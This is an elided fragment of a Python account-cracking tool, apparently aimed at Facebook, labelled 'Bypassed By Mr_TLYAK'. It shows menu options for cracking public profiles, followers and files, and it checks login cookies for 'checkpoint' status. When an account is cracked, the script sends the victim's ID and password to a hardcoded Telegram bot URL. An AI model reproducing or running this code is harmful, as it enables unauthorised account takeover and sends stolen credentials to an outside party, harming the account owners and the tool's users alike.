...
\033[1;31m		╚══════╝    ╚═╝  ╚═╝     ╚══╝╚══╝
		...
		\033[1;34m[ instagram : 127.0.0]\033[1;37m
		\033[1;31m[ Github : SAW4x ]
		\033[1;92m Bypassed By Mr_TLYAK
""")
def login():
	try:
...
def login_lagi334():
	try:
		...
		print(f'{x}[{h}•{x}]{h} Good LOGIN python SAWxVIP-Bypass.py !{x} ');time.sleep(1)
		os.system("python SAWxVIP-Bypass.py")
		exit()
...
def menu(my_id):
	...
	sol().print(fx)
	SAW = """\033[1;31m               01 CRACK PUBLIC
		\033[1;31m 02 CRACK PUBLIC (MULTI)
		\033[1;37m 03 CRACK FOLLOWERS
		\033[1;97m 04 CRACK FILE
		\033[1;34m 05 MY TELEGRAM
		\033[1;34m 00 EXIT"""
	uuid = str(os.geteuid()) + str(os.getlogin())
	id = "".join(uuid)

	print(f"\x1b[37;1m		\033[1;97m[ \033[1;92m YOUR ID  : \033[1;92m{id} \033[1;97m]") 
	print("")
	print(f"{SAW}")
	jh = input(x+''+p+''+x+' \n	CHOICE : ')
	print("")
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				if 'no' in taplikasi:
					...
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}\n{infoakun}'
					requests.get(f"https://api.telegram.org/bot5184052776:/sendMessage?chat_id=877429061&text=𝙽𝚎𝚠 𝙰𝚌𝚌𝚘𝚞𝚗𝚝𝚜 \n[ OK ]\n ID : {idf}\n PASSWORD : {pw} ")
					statusok1 = nel(statusok, style='green')
